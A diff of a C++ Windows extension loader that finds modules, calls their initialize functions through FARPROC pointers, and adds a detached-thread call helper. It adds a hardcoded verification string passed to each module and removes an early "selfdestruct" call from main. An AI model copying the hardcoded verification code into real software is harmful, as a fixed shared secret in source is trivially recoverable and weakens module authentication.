@@ -9,8 +9,10 @@
 #include <memory>
 #include <array>
 
-#include "./ModulConfig/Config.h"
+#include "./ConfigManager/Config.h"
 #include "./src/CommandsAndControll.h"
+
+#define VERIFICATION_CODE "12234"
 
 class FunctionPointer;
 
@@ -51,6 +53,17 @@ public:
             throw std::runtime_error("Function pointer is not set.");
         }
         return f(std::forward<Args>(args)...);
+    }
+    template <typename Ret, typename... Args>
+    void callInThread(Args... args) const {
+        std::thread([this, args...]() {
+            try {
+                this->call<Ret>(args...);
+            }
+            catch (const std::exception& ex) {
+                std::cerr << "Error calling function in thread: " << ex.what() << std::endl;
+            }
+            }).detach();
     }
 private:
     FARPROC func = nullptr;
@@ -106,8 +119,8 @@ static int initializeModul(std::unordered_map<std::string, FunctionPointer>& fun
         std::cout << "Error initializing" << std::endl;
         return 1;
     }
-    it->second.call<void, const char*>(location.c_str());
-    std::cout << "Initialized" << std::endl;
+    int initializeStatus = it->second.call<int, const char*, const char*>(VERIFICATION_CODE, location.c_str());
+    std::cout << "Initialized with error code: " << initializeStatus << std::endl;
     return 0;
 }
 static std::vector<std::filesystem::path> getExtensionsPath() {
@@ -157,8 +170,6 @@ static std::unordered_map<std::string, ModuleStruct> getExtensions() {
     return extensions;
 }
 int main() {
-    processMessage("selfdestruct");
-    return 0;
     std::unordered_map<std::string, ModuleStruct> extensions = getExtensions();
 
     for (const auto& [moduleName, moduleStruct] : extensions) {
